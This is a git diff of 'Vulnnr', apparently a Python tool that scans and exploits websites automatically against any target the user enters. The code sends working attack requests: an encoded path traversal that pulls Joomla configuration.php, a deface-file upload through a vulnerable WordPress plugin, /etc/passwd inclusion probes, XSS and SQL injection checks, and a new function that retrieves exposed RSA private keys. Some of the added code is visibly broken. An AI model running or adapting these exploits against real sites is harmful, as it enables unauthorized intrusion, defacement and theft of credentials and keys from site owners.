@@ -87,25 +87,33 @@ proxy = proxyss()
 
 
 def autoupdate():
-    with open('config.json') as json_file:
-        data = json.load(json_file)
-    if data['check-for-updates'] == "yes":
+    try:
 
-        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Checking for updates...")
-        test = requests.get("https://github.com/X-x-X-0/Vulnnr/blob/main/checks.txt")
-        time.sleep(2)
-        if Version in test.text:
-            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}looks like u are using Vulnnr v{Version} upto date!")
+        with open('config.json') as json_file:
+            data = json.load(json_file)
+        if data['check-for-updates'] == "yes":
+
+            print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Checking for updates...")
+            test = requests.get("https://github.com/X-x-X-0/Vulnnr/blob/main/checks.txt")
             time.sleep(2)
-            os.system('cls;clear')
-            banner()
+            if Version in test.text:
+                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}looks like u are using Vulnnr v{Version} upto date!")
+                time.sleep(2)
+                os.system('cls;clear')
+                banner()
+            else:
+                print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}looks like u are using Vulnnr v{Version}, sadly this version is currently out of date please update repo!")
+                print(f"{PURPLE} [ {GREEN}? {PURPLE}] {GREEN}https://github.com/X-x-X-0/Vulnnr.git")
+                sys.exit()
         else:
-            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}looks like u are using Vulnnr v{Version}, sadly that is currently out of date please update repo!")
-            print(f"{PURPLE} [ {GREEN}? {PURPLE}] {GREEN}https://github.com/X-x-X-0/Vulnnr.git")
-            sys.exit()
-    else:
-        banner()
-        pass
+            banner()
+            pass
+
+    except (KeyboardInterrupt, SystemExit):
+        print(f"\n\n {PURPLE}[ {GREEN}! {PURPLE}] {RESET} {CYAN}Leaving {YELLOW}Vulnnr...")
+
+        sys.exit()
+        raise
 autoupdate()
 
 dirs = [
@@ -271,7 +279,17 @@ def config(url, path):
                 pass
             elif "cloudflare" in GetConfig.text:
                 pass
+            elif "很抱歉，您要访问的页面不存在" in GetConfig.text:
+                pass
             elif " You are lost!" in GetConfig.text:
+                pass
+            elif "invalid file" in GetConfig.text:
+                pass
+            elif "ошибка" in GetConfig.text:
+                pass
+            elif "見つかりません" in GetConfig.text:
+                pass
+            elif "未找到" in GetConfig.text:
                 pass
             elif "file not here" in GetConfig.text:
                 pass
@@ -329,7 +347,9 @@ def htmi(url):
     elif "not found" in inc.text or "not found" in inc2.text:
         pass
     elif "cloudflare" in inc.text or "cloudflare" in inc2.text:
-         pass
+        pass
+    elif "很抱歉，您要访问的页面不存在" in inc.text or "很抱歉，您要访问的页面不存在" in inc2.text:
+        pass
     elif " You are lost!" in inc.text or "You are lost!" in inc2.text:
         pass
     elif "file not here" in inc.text or "file not here" in inc2.text:
@@ -343,7 +363,7 @@ def htmi(url):
 
 def com_s5(url):
     xp = url + '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
-    GetConfig = requests.get(xp, timeout=10)
+    GetConfig = requests.get(xp, timeout=5)
     if 'JConfig' in str(GetConfig.content):
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
         
@@ -377,11 +397,11 @@ def com_alberghi(url):
 def fileup(url):
     
     defaceFile = {'Filedata': (
-                      'VuLLnr.txt', open('shell/vuln.txt', 'rb'), 'text/html')
+                      'vuln.txt', open('shell/vuln.txt', 'rb'), 'text/html')
            }
     x = requests.post(url + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php', files=defaceFile, timeout=timeout)
     if 'id="wpvimgres"' in x.text:
-        uploader = url + '/wp-content/uploads/' + year + '/' + month + '/VuLLnr.txt'
+        uploader = url + '/wp-content/uploads/' + year + '/' + month + '/vuln.txt'
         GoT = requests.get(uploader, timeout=timeout)
         find = re.findall('<img src="http://(.*)" height="', x.text)
         GoT2 = requests.get('http://' + find[0], timeout=timeout)
@@ -418,6 +438,8 @@ def dirsscan(url, path):
                     pass
                 elif "not found" in GetConfig.text:
                     pass
+                elif "很抱歉，您要访问的页面不存在" in GetConfig.text:
+                    pass
                 elif "cloudflare" in GetConfig.text:
                     pass
                 elif "CloudFront" in GetConfig.text:
@@ -431,7 +453,7 @@ def dirsscan(url, path):
                 else:
                     
                     if GetConfig.status_code == 200:
-                        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url}")
+                        print(" {}[ {}$ {}] {}Found {GREEN}{}".format(PURPLE,GREEN,PURPLE,RESET,GREEN,GetConfig.url))
                     if "File Upload Manager" in GetConfig.text:
                         print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Might be a file upload? ")
                     if "Backup-Management (phpMyBackup v.0.4 beta * )" in GetConfig.text:
@@ -448,36 +470,45 @@ def dirsscan(url, path):
     
 def dorkinfos(url, path):
     Exp = url + str(path)
-    GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
-    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
-    if GetConfig.status_code == 200:
-        if "404" in GetConfig.text:
-            pass
-        
-        elif "not found" in GetConfig.text:
-            pass
-        elif "cloudflare" in GetConfig.text:
-                pass
-        elif " You are lost!" in GetConfig.text:
-                pass
-        elif "file not here" in GetConfig.text:
-                pass
-        elif "Please turn JavaScript on and reload the page" in GetConfig.text:
-            pass
-        elif "file not found" in GetConfig.text:
-            pass
-        elif "CoDeSys WebVisualization" in GetConfig.text:
-            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}(PLC/SCADA web visual interface)")
-        elif "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly.":
-            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}https://github.com/noperator/CVE-2019-18935")
-        elif "Index of /CFIDE/adminapi" in GetConfig.text:
-            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}")
-        elif "Camera Live Image" in GetConfig.text:
-            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET} | {YELLOW}IP Cameras")
-        elif "Adobe, the Adobe logo, ColdFusion, and Adobe ColdFusion are trademarks or registered trademarks of Adobe" in GetConfig.text:
-            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET} | {YELLOW}Contains Login Portals")
+    try:
 
+        GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
+    
+        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
+        if GetConfig.status_code == 200:
+            if "404" in GetConfig.text:
+                pass
+            elif "Not Found" in GetConfig.text:
+                pass
+            elif "Error. Page cannot be displayed" in GetConfig.text:
+                pass
+            elif "PAGE NOT FOUND" in GetConfig.text:
+                pass
+            elif "not found" in GetConfig.text:
+                pass
+            elif "cloudflare" in GetConfig.text:
+                    pass
+            elif " You are lost!" in GetConfig.text:
+                    pass
+            elif "file not here" in GetConfig.text:
+                    pass
+            elif "Please turn JavaScript on and reload the page" in GetConfig.text:
+                pass
+            elif "file not found" in GetConfig.text:
+                pass
+            elif "CoDeSys WebVisualization" in GetConfig.text:
+                print(" {}[ {}$ {}] {}Found {}{} {}| {}(PLC/SCADA web visual interface)".format(PURPLE,GREEN,PURPLE,RESET,GREEN,GetConfig.url,RESET,YELLOW))
+            elif "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly.":
+                print(" {}[ {}$ {}] {}Found {}{} {}| {}https://github.com/noperator/CVE-2019-18935".format(PURPLE,GREEN,PURPLE,RESET,GREEN,GetConfig.url,RESET,YELLOW))
+            elif "Index of /CFIDE/adminapi" in GetConfig.text:
+                print(" {}[ {}$ {}] {}Found {}{} {}".format(PURPLE,GREEN,PURPLE,RESET,GREEN,GetConfig.url,RESET))
+            elif "Camera Live Image" in GetConfig.text:
+                print(" {}[ {}$ {}] {}Found {}{} {} | {}IP Cameras".format(PURPLE,GREEN,PURPLE,RESET,GREEN,GetConfig.url,RESET,YELLOW))
+            elif "Adobe, the Adobe logo, ColdFusion, and Adobe ColdFusion are trademarks or registered trademarks of Adobe" in GetConfig.text:
+                print(" {}[ {}$ {}] {}Found {}{} {} | {}Contains Login Portals".format(PURPLE,GREEN,PURPLE,RESET,GREEN,GetConfig.url,RESET,YELLOW))
 
+    except:
+        pass
 
         
 
@@ -725,6 +756,12 @@ def Localize(url):
 
 
 
+def phpinfo(url):
+    url = requests.get(url).text
+    
+
+
+
 def photog(url):
     test = requests.get(url+"/wp-content/plugins/photo-gallery")
     if test.status_code == 200:
@@ -738,7 +775,10 @@ def autosuggest(url):
     '''
     Exploit https://www.exploit-db.com/exploits/45977
     '''
+
     test = requests.get(url+"/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&")
+    if "firewall" in test.text:
+        pass
     if test.status_code == 403:
         print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{test.url}?wpas_action=query&wpas_keys=1")
     else:
@@ -816,6 +856,21 @@ def wp_cherry(url):
                 name="CherryFramework ",
                 status=False
             )
+
+
+
+def serverkey(url):
+    first = requests.get(url+"/server-private.key")
+    second = requests.get(url+"/server.key")
+    third = requests.get(url+"/server-public.key")
+
+    if "-----BEGIN RSA PRIVATE KEY-----" in first.text or "-----BEGIN RSA PRIVATE KEY-----" in second.text or "-----BEGIN RSA PRIVATE KEY-----" in third.text:
+        print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}RSAKEY found {PURPLE}=> {GREEN}{first.url}")
+    else:
+        print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}RSAKEY {PURPLE}=> {RED}not found")
+        pass
+
+
 
 def wp_blaze(url):
         HEADERS['Content_Type'] = 'multipart/form-data'
@@ -932,11 +987,16 @@ def phpver(url):
             if u.status_code == 200:
                 output = subprocess.getoutput("curl "+url+"/mailman/listinfo/mailman -s | findstr POST").split('"')[1]
                 print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Backend {PURPLE}=> {GREEN}{output.replace('/mailman/listinfo/mailman', '')}")
+        
 
             #print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Backend {PURPLE}=> {GREEN}" + getvs['Server'])
         #if "Set-Cookie" in getvs:
             #print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Cookie {PURPLE}=> {GREEN}" + getvs['Set-Cookie'])
         else:
+            u = requests.get(url+"/mailman/listinfo/mailman")
+            if u.status_code == 200:
+                output = subprocess.getoutput("curl "+url+"/mailman/listinfo/mailman -s | findstr POST").split('"')[1]
+                print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Backend {PURPLE}=> {GREEN}{output.replace('/mailman/listinfo/mailman', '')}")
             pass
             #print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Serverinfo {PURPLE}=> {RED}Not Found")
 
@@ -955,7 +1015,7 @@ def wp_dirs(url):
         url1 = dir1.url.replace("//", '/')
         pass
     if dir1.status_code == 200:
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url1}")
+        print(" {}[ {}$ {}] {}Found {}{}".format(PURPLE,GREEN,PURPLE,RESET,GREEN,url1))
         pass
     dir2 = requests.get(url+"/wp-admin/install", timeout=timeout)
     url2 = dir2.url
@@ -963,7 +1023,7 @@ def wp_dirs(url):
         url2 = dir2.url.replace("//", '/')
         pass
     if dir2.status_code == 200:
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}{RESET}Found {GREEN}{url2}")
+        print(" {}[ {}$ {}] {}{}Found {GREEN}{}".format(PURPLE,GREEN,PURPLE,RESET,RESET,url2))
         
     dir3 = requests.get(url+"/wp-register.php", headers=HEADERS, timeout=timeout)
     
@@ -987,7 +1047,7 @@ def wp_dirs(url):
         url5 = dir5.url.replace("//", '/')
         pass
     if dir5.status_code == 200:
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url5}")
+        print(" {}[ {}$ {}] {}Found {}{}".format(PURPLE,GREEN,PURPLE,RESET,GREEN,url5))
 
     dir6 = requests.get(url+"/wp-content/uploads/wp-backup-plus/", timeout=timeout)
     url6 = dir6.url
@@ -995,7 +1055,7 @@ def wp_dirs(url):
         url6 = dir6.url.replace("//", '/')
         pass
     if dir6.status_code == 200:
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url6} {RESET}| {YELLOW} Take alook!")
+        print(" {}[ {}$ {}] {}Found {}{} {}| {} Take alook!".format(PURPLE,GREEN,PURPLE,RESET,GREEN,RESET,RESET,YELLOW,url6))
     
     dir7 = requests.get(url+"/wp-content/uploads/wp-backup-plus-backups/", timeout=timeout)
     url7 = dir7.url
@@ -1003,7 +1063,7 @@ def wp_dirs(url):
         url7 = dir7.url.replace("//", '/')
         pass
     if dir7.status_code == 200:
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{url7} {RESET}| {YELLOW} Take alook!")
+        print(" {}[ {}$ {}] {}Found {}{} {}| {} Take alook!".format(PURPLE,GREEN,PURPLE,RESET,GREEN,RESET,YELLOW,url7))
         
 
 
@@ -1125,7 +1185,7 @@ def mailman():
     #print(dns)
     except Exception as e:
         #os.system("cls;clear")
-        print(e)
+        
         banner()
         return main()
 
@@ -1158,7 +1218,7 @@ def parms(site):
                     #print(url.replace('///', '/'))
                     
                     with open(filename, "a+") as f:
-                        f.write(f"{url.replace('///', '/')}\n")
+                        f.write(f"\n{url.replace('///', '/')}\n")
                         #f.write(test.text)
                     f.close()
         return print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}PramSpider {PURPLE}=> {GREEN}collected results and saved to {filename}")
@@ -1183,12 +1243,12 @@ def xss(site):
                     if "///" in urls:
                         pass
                     #print(url.replace('///', '/'))
-                    XSS = requests.get(url + '><h1>Vulnnr</h1>', timeout=timeout, headers=HEADERS)
+                    XSS = requests.get(url + '<h1>Vulnnr</h1>', timeout=timeout, headers=HEADERS)
                     if "404" in XSS.text:
                         pass
                     else:
 
-                        if 'Vulnnr' in XSS.text:
+                        if '<h1>Vulnnr</h1>' in XSS.text:
                             
                             with open(filename, "a+") as f:
                                 f.write(f"{url.replace('///', '/')}\n")
@@ -1199,13 +1259,15 @@ def xss(site):
                 return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}XSS Scanner {PURPLE}=> {RED}None Found")
                 
 def LFI(site):
-    ## LIL PRAM SPIDER
+    ## LIL PRAM SPIDE
+    # LFI DOES NOT WOEK BC THERE IS a EX
 
     filename = "Results/LFISCAN.txt"
     GetLink = requests.get(site, timeout=timeout, headers=HEADERS)
     urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.text).replace(site, ''))
+    
     if len(urls) != 0:
-        #print(urls)
+        
         prams = []
         for url in urls:
             if ".php?" in str(url):
@@ -1214,6 +1276,8 @@ def LFI(site):
                 for url in prams:
                     if "///" in urls:
                         pass
+                    print(urls.replace([1]+'.php', '///'))
+                    print(urls)
                     #print(url.replace('///', '/'))
                     LFI = requests.get(url + '../../../../../etc/passwd', timeout=timeout, headers=HEADERS)
                    
@@ -1366,14 +1430,14 @@ def CheckSqliURL(site, urls):
                     MaybeSqli.append(site + '/' + url)
                 
             except Exception as e:
-                print(e)
+            
                 pass
 
         if len(MaybeSqli) != 0:
             return CheckSqli(MaybeSqli, site)
         return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}SQL Injection {PURPLE}=> {RED}Not Found")
     except Exception as e:
-        print(e)
+        
         return 
 
 
@@ -1493,7 +1557,7 @@ def CheckSqli(MaybeSqli, site):
 
             break
         except Exception as e:
-            print(e)
+            #print(e)
             return 
 
 
@@ -1552,6 +1616,8 @@ def auto(url):
     if url == "":
         normalerrors()
         return main()
+    
+
     if "http" in url:
         pass
     else:
@@ -1561,6 +1627,7 @@ def auto(url):
     try:
         print(f"\n {PURPLE}[ {GREEN}~ {RESET} Looking for Serverinfo {GREEN}~{RESET} {PURPLE}]{RESET}")
         
+
         cms = serialize(url)
         
         mm = url.replace('https://', '').replace('http://', '').replace('https:', '').replace('http:', '').replace('/', '')
@@ -1573,7 +1640,9 @@ def auto(url):
         if data['proxys'] == "yes":
             print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Loaded proxy {PURPLE}=> {YELLOW}{proxy} {RESET}")
         
-        
+        if "rf.gd" in url:
+            print(f" {PURPLE}[ {GREEN}~ {RESET} infinityfree is shared hosting passing {GREEN}~{RESET} {PURPLE}]{RESET}")
+            pass 
         
         print(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} CMS {PURPLE}=> {GREEN}", cms['name'])
         phpver(url)
@@ -1612,6 +1681,7 @@ def auto(url):
             spritz(url)
             photog(url)
             eshop(url)
+            serverkey(url)
             Localize(url)
             tutor(url)
             boldgrid(url)
@@ -1632,7 +1702,8 @@ def auto(url):
             com_gmap(url)
             dorkinfo(url)
             Exploit(url)
-            LFI(site)
+            #LFI(site)
+            serverkey(url)
             dirs2(url)
             Scriptegrator(url)
             com_cckjseblod(url)
@@ -1649,13 +1720,14 @@ def auto(url):
             xss(site)
 
         else:
-            print(f" {PURPLE}[ {GREEN}~ {RESET} Could not detect CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
+            #print(f" {PURPLE}[ {GREEN}~ {RESET} Could not detect CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
             
             dirs2(url)
             dorkinfo(url)
             print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             Exploit(url)
-            LFI(site)
+            serverkey(url)
+            #LFI(site)
             asistorage(url)
             htmi(url)
             gf(url)
@@ -1674,8 +1746,8 @@ def auto(url):
             print(f"\n{PURPLE} [ {GREEN}~ {RESET} Domain scan {GREEN}~{RESET} {PURPLE}]{RESET}")
             print(f"{GREEN}{host.replace(',', ' : ')}")
 
-    except Exception as e:
-        print(e)
+    except Exception:
+    
         print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout")
         return
 
@@ -2039,7 +2111,7 @@ def main():
         #userinput = input(f"{RESET}{user}{YELLOW}@{CYAN}{host_name}:{RED}~{CYAN}/{foldername}{RED}$ {RESET}")
         #tmp = sp.call('clear', shell=True)
     except (KeyboardInterrupt, SystemExit):
-        print(f"\n{c}Leaving {Y}Madsploit... {w}")
+        print(f"\n\n {PURPLE}[ {GREEN}! {PURPLE}] {RESET} {CYAN}Leaving {YELLOW}Vulnnr...")
 
         sys.exit()
         raise
@@ -2110,7 +2182,7 @@ def main():
                     auto(url)
                     print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Done!")
         except Exception as e:
-            print(e)
+            
             print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Could not open {RED}{file_name}!\n")
             return main()
         
@@ -2118,7 +2190,9 @@ def main():
         print(f"\n {PURPLE}[ {GREEN}~ {RESET}Vuln Scanner/exploiter  {GREEN}~ {PURPLE}] {RESET}\n")
         url = input(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Target{PURPLE} => {RESET}")
         init_time = time.time()
-        
+        if "rf.gd" in url:
+            print(f" {PURPLE}[ {GREEN}~ {RESET} infinityfree is shared hosting passing {GREEN}~{RESET} {PURPLE}]{RESET}")
+            return main()
         auto(url)
         end_time = time.time()
         elapsed_time = end_time - init_time
@@ -2135,9 +2209,16 @@ def main():
         pass
         #os.system(f"{userinput}")
     except (KeyboardInterrupt, SystemExit):
-        print("EXIT")  
+        print(f"\n\n{PURPLE}[ {GREEN}! {RESET} {CYAN}Leaving {YELLOW}Vulnnr...")
+
+        sys.exit()
+        raise 
     except Exception as e:
-        print(e)
+        
+        print(f"\n\n{PURPLE}[ {GREEN}! {RESET} {CYAN}Leaving {YELLOW}Vulnnr...")
+
+        sys.exit()
         return main()
+
     return main()
 main()
